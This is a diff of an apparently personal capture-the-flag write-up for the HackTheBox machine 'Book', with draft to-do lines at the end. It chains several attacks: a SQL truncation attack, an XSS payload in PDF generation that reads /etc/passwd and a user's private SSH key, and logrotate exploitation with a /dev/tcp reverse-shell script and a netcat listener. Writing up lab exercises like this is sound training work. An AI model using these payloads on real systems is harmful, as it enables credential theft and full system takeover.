@@ -29,7 +29,7 @@ We see SSH and a webserver running.
 
 ## Enumerating Website
 
-The index page shows a login/signup page for what seems like a library app.
+The index page shows a login+signup page for what seems like a library app.
 
 ![http home page](images/book/libraryhomepage.png)
 
@@ -39,13 +39,13 @@ Let's run dirbuster to look for more pages.
 
 ![dirbuster results](images/book/dirbustroot.png)
 
-The `admin` path is worth a closer look. And we find a similar login page but for administrators. 
+The `admin` path is worth a closer look. We find a similar login page but for administrators. 
 
 ![admin page](images/book/adminsignin.png)
 
 ### Logging In As User
 
-Now, let's put on the hat of a user and try signing up for an account. So that we can log in and see what inside the member area.
+Now, let's put on the hat of a user and sign up for an account to recon inside the membership area.
 
 After clicking on the "SIGN UP" button and creating a new account, we can sign into the website.
 
@@ -62,7 +62,7 @@ The contact page leaked the **email address of the administrator**.
 
 ## SQL Truncation Attack
 
-The source code of the login/signup page contains a client-side validation function for the signup form.
+The source code of the login+signup page contains a client-side validation function for the signup form.
 
 `curl http://10.10.10.176`
 
@@ -83,11 +83,11 @@ function validateForm() {
 <SNIP>
 ```
 
-This function checks for empty form fields. 
+This function checks for empty form fields and returns certain error messages. 
 
-More importantly, the error messages revealed that the email field should not be more than 20 characters. This suggests that the backend might not be properly configured to handle inputs exceeding that length.
+More importantly, the error messages revealed that **the email field should not be more than 20 characters**. This suggests that the backend might not be properly configured to handle inputs exceeding that length.
 
-Since we've obtained the admin email, let's try a SQL truncation attack with the aim of getting access to an admin account.
+Since we've obtained the admin email address, let's try a [SQL truncation attack](https://resources.infosecinstitute.com/sql-truncation-attack/#gref) with the aim of getting access to an admin account on the website.
 
 This is how the attack looks like in Burp:
 
@@ -149,7 +149,7 @@ With this payload, the generated PDF file shows us the passwd file.
 
 ![passwd](images/book/passwd.png)
 
-We see that only root and reader have login shells. Let's modify the payload to get the private SSH key of the user reader.
+We see that only root and reader have login shells. Let's modify the payload to get the private SSH key of `reader`.
 
 `<script>x=new XMLHttpRequest;x.onload=function(){document.write("<font size='1'>" + this.responseText + "</font>")};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>`
 
@@ -160,17 +160,16 @@ This payload has two main changes:
 
 After sending this modifed payload, we generate the PDF again.
 
-This time, the PDF contains the private SSH key of reader. We save the key into a file `reader`.
+This time, the PDF contains the private SSH key of reader. We save the key into a file `readerkey`.
 
 With the SSH key, we can log in as `reader` to get the **user flag**.
 
 ```
-root@kali:~/htb/book# ssh reader@10.10.10.176 -i reader
+# ssh reader@10.10.10.176 -i readerkey
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
 <SNIP>
 reader@book:~$ ls
 backups user.txt
-reader@book:~$ cat user.txt 
 ```
 
 ## Exploiting Logrotate
@@ -187,11 +186,17 @@ How does it work:
 * By default, the file is created with the same permissions as the original log file. 
 * Since the attacker can write to the original log file, the attack can also write to this newly created file.
 
-A typical exploitation path is to write a payload into `/etc/bash_completion.d` so that it will be executed when root logs in. 
+A typical exploitation path for privilege escalation is to write a payload into `/etc/bash_completion.d` so that it will be executed when root logs in. 
+
+(In this case, the relevant [shell startup file](http://www.linuxfromscratch.org/blfs/view/svn/postlfs/profile.html) is `/etc/profile.d/bash_completion.sh`.)
 
 ### Exploit Conditions
 
-We need logrotate to run to trigger our exploit. Psspy shows us that logrotate is being forced to rotate the logs every 5 seconds. So that works.
+We need logrotate to **rotate our log file** to trigger our exploit. 
+
+Psspy shows us that logrotate is being forced to rotate the logs every 5 seconds. So that works.
+
+However, we cannot view the config file `/root/log.cfg` so we will have to guess what's inside.
 
 ```
 2020/04/19 10:58:45 CMD: UID=0    PID=113349 | /usr/sbin/logrotate -f /root/log.cfg 
@@ -202,26 +207,33 @@ We need logrotate to run to trigger our exploit. Psspy shows us that logrotate i
 2020/04/19 10:58:50 CMD: UID=0    PID=113353 | sleep 5 
 ```
 
-Also, we need root to log in to trigger our payload.
-
-Root is logging on every minute (Contrived)
+Also, we need **root to log in** to trigger our payload. And oddly enough, checking with the `last` command, that's exactly what root seems to be doing every minute.
 
 ### Using Logrotten
 
-Logrotten is a software that helps us to exploit logrotate as described above.
+[Logrotten](https://github.com/whotwagner/logrotten) is a software that helps us to exploit logrotate as described above.
 
-Conditions:
+First, we need to prepare a **bash script payload**.
 
-Our payload file is a shell script that pushes a reverse bash shell to us if the user who logs in is root (userid is 0).
+Our `payloadfile` is a shell script that pushes a reverse bash shell to us if the user who logs in is root (userid is 0).
 
 ```
 #!/bin/bash
-if [ `id -u` -eq 0 ]; then (bash -i >& /dev/tcp/10.10.14.6/8888 0>&1 &); fi
+if [ `id -u` -eq 0 ]; then (bash -i >& /dev/tcp/10.10.X.X/8888 0>&1 &); fi
 ```
 
-We know that logrotate is forced to run every five seconds, using the config file `/root/log.cfg`.
+Then, we use `logrotten` with the following syntax.
 
-`/usr/sbin/logrotate -f /root/log.cfg`
+```
+$ ./logrotten -p ./payloadfile  /home/reader/backups/access.log`
+Waiting for rotating /home/reader/backups/access.log...
+```
+
+However, we get stuck here. Apparently, `access.log` is not being rotated.
+
+Let's review what we know.
+
+We know that logrotate is forced to run every five seconds, using the config file `/root/log.cfg`.
 
 Unfortunately, we cannot view the config file.
 
@@ -229,23 +241,17 @@ Our logrotten attack is stuck at waiting for a rotation. This means that somehow
 
 Possible reasons:
 
-* `backups` is not included in `log.cfg`
-* The `ifempty` directive active, meaning it will not rotate an empty file.
+* `backups` directory is not included in `log.cfg`
+* The `ifempty` directive is active, meaning logrotate will not rotate an empty file.
 
-Assuming second reason is true, let's write something to the log file to trigger a rotate.
+Assuming second reason is true, let's write something to `access.log` to trigger a rotate.
 
 `echo test > access.log`
 
-Yes, the rotate was triggered as it did not find an empty file this time.
+Yes, the rotate was triggered as logrotate did not find an empty log file this time.
 
 ```
-reader@book:/tmp$ ./logrotten -p ./payloadfile -d /home/reader/backups/access.log
-logfile: /home/reader/backups/access.log
-logpath: /home/reader/backups
-logpath2: /home/reader/backups2
-targetpath: /etc/bash_completion.d/access.log
-targetdir: /etc/bash_completion.d
-p: access.log
+reader@book:/tmp$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
 Waiting for rotating /home/reader/backups/access.log...
 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
 Waiting 1 seconds before writing payload...
@@ -255,11 +261,12 @@ Done!
 As root is logging in every second, we got a reverse shell connection almost immediately.
 
 ```
-root@book:~# root@kali:~/htb/book# nc -nvlp 8888
+# nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.10.14.6] from (UNKNOWN) [10.10.10.176] 45694
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.176] 45694
 root@book:~# whoami
 whoami
+root
 ```
 
 ## Ending Thoughts
@@ -268,11 +275,16 @@ Both the SQL truncate attack and the code injection exploit are new to me. Altho
 
 Overall, a very educational box for me.
 
-**References**
+**SQL Truncation Attack**
+
+* https://resources.infosecinstitute.com/sql-truncation-attack/#gref
+* https://docs.microsoft.com/en-us/archive/msdn-magazine/2006/november/sql-security-new-sql-truncation-attacks-and-how-to-avoid-them
+
+**Logrotate and Logrotten**
 
 * https://linux.die.net/man/8/logrotate
 * https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
 
-
 include python script for sql truncation
 complete logrotate
+try symlink myself
